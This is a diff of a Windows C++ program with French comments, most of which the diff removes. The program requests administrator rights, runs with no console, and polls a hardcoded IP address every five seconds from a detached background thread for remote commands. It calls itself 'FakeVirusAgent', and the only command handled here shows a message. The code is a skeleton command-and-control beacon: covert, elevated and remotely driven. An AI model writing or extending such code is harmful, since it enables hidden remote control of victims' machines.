@@ -7,11 +7,9 @@
 
 using namespace std;
 
-// Lier avec la bibliothèque wininet.lib
 #pragma comment(lib, "wininet.lib")
 
 void RequestAdminPrivileges() {
-    // Vérifie si le programme tourne déjà en mode admin
     BOOL isAdmin = FALSE;
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
     PSID pAdminGroup;
@@ -22,12 +20,11 @@ void RequestAdminPrivileges() {
     }
 
     if (!isAdmin) {
-        // Relance le programme avec les droits admin
         TCHAR szPath[MAX_PATH];
         GetModuleFileName(NULL, szPath, MAX_PATH);
 
         SHELLEXECUTEINFO sei = { sizeof(sei) };
-        sei.lpVerb = TEXT("runas");  // Demande les droits administrateur
+        sei.lpVerb = TEXT("runas");
         sei.lpFile = szPath;
         sei.hwnd = NULL;
         sei.nShow = SW_SHOWDEFAULT;
@@ -49,15 +46,15 @@ void ShowMessage() {
 // Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
 string GetCommand() {
     string command;
-    // Ouvre une session Internet.
+
     HINTERNET hInternet = InternetOpenA("FakeVirusAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
-        // Ouvre l'URL spécifiée.
+
         HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
         if (hConnect) {
             char buffer[256];
             DWORD bytesRead = 0;
-            // Lit la réponse du serveur.
+
             if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                 buffer[bytesRead] = '\0';
                 command = buffer;
@@ -73,11 +70,11 @@ string GetCommand() {
 void ListenForCommand() {
     while (true) {
         string cmd = GetCommand();
-        // Si la commande contient le mot "show", afficher le message.
+
         if (cmd.find("show") != string::npos) {
             ShowMessage();
         }
-        // Pause de 5 secondes avant la prochaine requête.
+
         this_thread::sleep_for(chrono::seconds(5));
     }
 }
@@ -85,11 +82,11 @@ void ListenForCommand() {
 // Point d'entrée de l'application Windows (aucune console ne sera affichée)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
-    // Lance le thread qui écoute les commandes distantes.
-    thread listener(ListenForCommand);
-    listener.detach(); // Détache le thread pour qu'il fonctionne en arrière-plan.
 
-    // Boucle principale pour maintenir l'application en exécution.
+    thread listener(ListenForCommand);
+    listener.detach();
+
+
     while (true) {
         this_thread::sleep_for(chrono::seconds(60));
     }
